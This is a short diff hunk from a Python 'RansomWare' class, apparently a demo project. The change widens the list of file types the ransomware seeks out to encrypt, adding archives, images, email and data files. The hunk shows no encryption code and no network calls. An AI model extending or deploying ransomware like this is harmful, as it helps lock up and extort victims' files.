@@ -22,7 +22,7 @@ class RansomWare:
     
     # File exstensions to seek out and Encrypt
     file_exts = [
-        'txt,exe,png',
+        'txt,exe,png,zip,email,bat,jpeg,jpg,dat,rar,msg',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
